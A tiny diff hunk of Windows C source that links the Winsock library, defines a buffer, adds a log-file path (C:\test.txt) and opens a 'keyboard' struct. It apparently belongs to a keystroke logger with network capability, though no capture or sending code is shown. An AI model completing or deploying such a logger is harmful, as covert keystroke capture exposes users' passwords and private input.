@@ -9,7 +9,7 @@
 
 #pragma comment(lib, "ws2_32.lib")
 #define BUFFSIZE 1024
-
+# define LOGFILE		"C:\\test.txt"
 struct keyboard
 {
 	DWORD code;
